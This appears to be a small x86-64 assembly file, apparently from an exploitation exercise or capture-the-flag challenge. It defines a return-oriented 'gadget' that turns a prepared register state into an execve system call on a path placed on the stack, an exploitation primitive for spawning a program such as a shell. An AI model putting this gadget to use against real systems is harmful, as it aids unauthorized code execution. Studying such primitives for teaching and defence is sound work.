        .global gadget

        .text

# rax: 0x3c
# rdi: 0
# rdx: {NULL, ...}
# rsi: path + '\n'
gadget:
        dec     %rax            # rax: 0x3c -> 0x3b (sys_execve)
        mov     %rdx, %rsi      # rsi: argv = {NULL}
        mov     %rdi, %rdx      # rdx: envp = NULL
        lea     16(%rsp),%rdi   # rdi: path
        ret

# vim: ft=gas
